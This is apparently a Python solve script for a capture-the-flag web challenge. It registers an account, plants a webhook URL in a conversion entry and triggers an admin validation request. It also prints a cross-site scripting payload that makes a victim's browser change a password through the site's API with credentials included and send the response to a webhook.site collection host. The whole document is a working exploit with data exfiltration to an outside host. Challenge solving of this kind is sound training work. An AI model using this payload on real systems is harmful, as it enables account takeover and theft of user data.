import requests

url = 'https://bsbxrnhl.web.ctf.uscybergames.com/'
webhook = 'https://webhook.site/b19bc55c-9a23-4991-add8-89ba8b66864b?'

# PUT is not supported by cors, so we can SSRF it
js = f"""
<script>
fetch('{url}api/change-password', {{
    method: 'PUT',
    credentials: 'include',
    headers: {{
        'Content-Type': 'application/json'
    }},
    body: JSON.stringify({{
        'new_password': 'test'
    }})
}})
.then(response => response.json())
.then(data => {{
    fetch('{webhook}DATA', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json'
        }},
        body: JSON.stringify(data)
    }});
}});
</script>
"""

print(js) # pPUT INTO WEBHOOK

s = requests.Session()

body = {
    'username': 'script',
    'password': 'script',
}

r = s.post(url + 'api/signup', json=body)
print(r.text)
r = s.post(url + 'api/login', json=body)
print(r.text)

# {metric_base: "a", imperial_base: "b", image_url: "c", reference_url: "d", notes: "e"}
body = {
    'metric_base': 'a',
    'imperial_base': 'b',
    'image_url': 'img',
    'reference_url': webhook + 'REF',
    'notes': 'note',
}

r = s.post(url + 'api/conversions', json=body)
print(r.text)

r = s.get(url + 'api/conversions')
conversions = r.json()

idx = len(conversions)
r = s.post(url + f'api/request-validation/{idx}')
print(r.text)